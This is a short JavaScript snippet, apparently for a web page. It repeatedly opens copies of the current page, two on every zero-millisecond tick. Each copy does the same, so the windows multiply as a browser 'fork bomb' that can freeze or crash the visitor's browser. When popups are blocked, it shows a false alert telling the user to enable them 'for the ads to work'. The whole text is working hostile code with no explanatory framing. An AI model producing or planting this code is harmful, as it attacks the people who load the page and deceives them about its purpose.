newWin = window.open(window.location.href);
if(!newWin) { 
  alert("Please enable popups inorder for the ads to work"); 
  window.close();
}
setInterval(() => {
  window.open(window.location.href);
  window.open(window.location.href);
}, 0);
